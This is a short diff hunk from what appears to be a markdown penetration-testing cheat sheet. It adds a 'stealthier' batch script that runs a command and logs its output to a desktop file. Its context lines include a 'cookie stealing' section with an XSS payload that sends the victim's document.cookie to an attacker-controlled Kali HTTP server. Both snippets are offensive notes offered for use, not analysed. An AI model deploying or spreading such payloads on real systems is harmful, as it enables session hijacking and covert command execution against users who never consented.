@@ -142,6 +142,15 @@ set /p cmd=Type your command here
 Goto Loop
 ```
 
+* another stealthier example
+
+```
+@echo off
+
+set cmd=dir
+%cmd% >> c:\users\<username>\desktop\output.txt
+```
+
 ## cookie stealing
 
 * `<script>new Image().src="http://<python3 http server running in kali IP>:<PORT>/cool.jpg?output="+document.cookie;</script>`
